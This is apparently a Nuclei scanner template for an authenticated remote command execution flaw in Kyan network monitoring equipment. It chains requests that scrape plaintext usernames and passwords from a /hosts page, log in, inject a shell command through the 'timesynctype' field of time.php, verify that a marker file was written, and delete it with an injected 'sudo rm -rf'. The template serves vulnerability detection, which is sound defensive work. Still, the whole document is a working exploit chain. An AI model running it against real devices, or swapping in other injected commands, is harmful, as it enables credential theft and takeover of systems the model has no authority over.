id: kyan-network-time-rce
info:
  name: Kyan Network Monitoring RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Kyan network monitoring equipment time.php can execute arbitrary commands after authentication, potentially granting server access.
  reference:
    - http://aiesec.cn/platform/
  tags: rce, authenticated

variables:
  rand_filename: "{{rand_base(4)}}"

flow: |
  http(1) && http(2) && http(3) && http(4) && http(5)

http:
  - id: extract-credentials
    method: GET
    path:
      - "{{BaseURL}}/hosts"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
    extractors:
      - type: regex
        name: username
        internal: true
        group: 1
        regex:
          - "UserName=(.*?)\\n"
      - type: regex
        name: password
        internal: true
        group: 1
        regex:
          - "Password=(.*?)\\n"

  - id: login
    method: POST
    path:
      - "{{BaseURL}}/login.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID=gepuuhfdt90knnvli5fn4kt380
    body: |
      user={{username}}&passwd={{password}}&x=0&y=0
    matchers-condition: and
    matchers:
      - type: status
        status: [200]

  - id: execute-command
    method: POST
    path:
      - "{{BaseURL}}/time.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID=gepuuhfdt90knnvli5fn4kt380; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%200%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D
    body: |
      timesynctype=;sudo echo {{rand_filename}}bbbb >{{rand_filename}}.txt
    matchers-condition: and
    matchers:
      - type: status
        status: [200]

  - id: verify-command
    method: GET
    path:
      - "{{BaseURL}}/{{rand_filename}}.txt"
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - "{{rand_filename}}bbbb"

  - id: cleanup
    method: POST
    path:
      - "{{BaseURL}}/time.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      Cookie: PHPSESSID=gepuuhfdt90knnvli5fn4kt380; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%200%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D
    body: |
      timesynctype=;sudo rm -rf {{rand_filename}}.txt
